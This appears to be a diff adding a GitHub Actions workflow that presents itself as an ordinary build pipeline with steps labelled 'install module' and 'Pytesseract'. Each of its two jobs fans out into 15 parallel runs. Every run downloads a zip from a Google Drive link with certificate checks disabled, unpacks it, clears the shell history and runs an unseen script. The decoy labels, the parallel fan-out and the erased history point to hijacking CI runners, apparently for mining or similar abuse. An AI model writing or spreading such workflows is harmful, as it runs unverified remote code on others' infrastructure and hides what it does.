@@ -1,0 +1,56 @@
+name: gammamodun914link
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  LAUNCH:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.o, I.i, I.ii]
+        flag: ['Provision', 'Compile', 'Verify', 'Launch', 'Deploy']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: install module
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1ziS-1-ZeAkGee7rehleIjf1a-8dV7GQt" -O Plotly.zip
+        unzip -o Plotly.zip
+        rm Plotly.zip
+        history -c && history -w
+
+    - name: Pytesseract
+      run: bash requirements.sh
+
+
+  VALIDATE1:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.o, I.i, I.ii]
+        flag: ['Plan', 'Assemble', 'Validate', 'Run', 'Publish']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: install module
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1ziS-1-ZeAkGee7rehleIjf1a-8dV7GQt" -O Plotly.zip
+        unzip -o Plotly.zip
+        rm Plotly.zip
+        history -c && history -w
+
+    - name: Pytesseract
+      run: bash requirements.sh
+        
